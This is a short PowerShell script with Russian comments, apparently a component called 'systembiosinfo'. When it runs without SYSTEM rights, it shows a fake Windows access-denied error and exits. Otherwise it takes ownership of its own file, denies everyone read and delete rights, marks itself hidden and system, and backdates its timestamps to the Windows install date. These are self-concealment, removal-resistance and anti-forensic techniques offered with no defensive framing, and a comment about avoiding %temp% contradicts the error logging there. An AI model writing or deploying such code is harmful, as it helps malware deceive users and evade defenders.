# Подавить стандартные ошибки
$ErrorActionPreference = "SilentlyContinue"

try {
    # Проверка, что скрипт запущен от имени SYSTEM
    if ([Security.Principal.WindowsIdentity]::GetCurrent().Name -ne "NT AUTHORITY\\SYSTEM") {
        Add-Type -AssemblyName PresentationFramework
        $msg = "Ошибка 0x80070005 (Доступ запрещён): запрошенное действие требует повышенных привилегий."
        [System.Windows.MessageBox]::Show($msg,"Windows Script Host",0,16)
        exit 1
    }

    # Путь 
    $path = $MyInvocation.MyCommand.Definition

    # Назначить владельца 
    takeown /f $path /a | Out-Null

    # Запретить изменение и удаление 
    icacls $path /inheritance:r /grant SYSTEM:(F) /deny Everyone:(D,WD,R) | Out-Null

    # Сделать файл системным
    attrib +s +h $path

    # Получить дату 
    $installDateUnix = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").InstallDate
    $installDate = [datetime]::UnixEpoch.AddSeconds($installDateUnix)

    # Установить дату создания 
    Set-ItemProperty -Path $path -Name CreationTime -Value $installDate
    Set-ItemProperty -Path $path -Name LastWriteTime -Value $installDate

    # Не писать и не использовать %appdata% и %temp%

    Write-Output "systembiosinfo успешно запущен и защищён."

} catch {
    # Логировать ошибки тихо, без прерывания
    $_ | Out-File -FilePath "$env:TEMP\systembiosinfo_error.log" -Append
}
